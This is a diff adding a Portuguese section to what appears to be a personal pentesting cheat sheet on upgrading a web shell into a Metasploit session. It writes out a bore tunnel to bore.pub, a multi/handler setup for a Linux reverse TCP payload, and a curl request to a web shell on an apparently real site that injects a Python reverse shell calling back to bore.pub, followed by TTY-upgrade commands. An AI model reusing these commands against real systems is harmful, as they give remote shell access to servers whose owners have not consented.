@@ -191,6 +191,45 @@ $diretorio -> close();
 ?>
 ```
 ---
+# Transferir reversa via web shell para shell do MSFconsole.
+- lembre-se do commando ligado:
+```
+bore local 4444 --to bore.pub
+```
+
+- no msfconsole utilize esses comandos
+```
+use exploit/multi/handler
+set payload linux/x64/shell_reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 4444
+run
+```
+- caso for via webshell como foi no meu caso utilize um payload semelhante:
+
+```
+curl -X POST --data-urlencode "pass=system('python3 -c \"import socket,os;s=socket.socket();s.connect((\\\"bore.pub\\\",15484));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\\\"/bin/sh\\\")\"');" https://pil.loyolavirtual.net/by.php
+```
+
+- melhorar experiencia da shell agora:
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ou
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+ou
+
+/bin/sh -i
+```
+- te permitir a usar o clear:
+```
+export TERM=xterm
+reset
+```
+---
 # Shells Staged & Stagedless + Buildando Stagedless via msfvenom
 
 
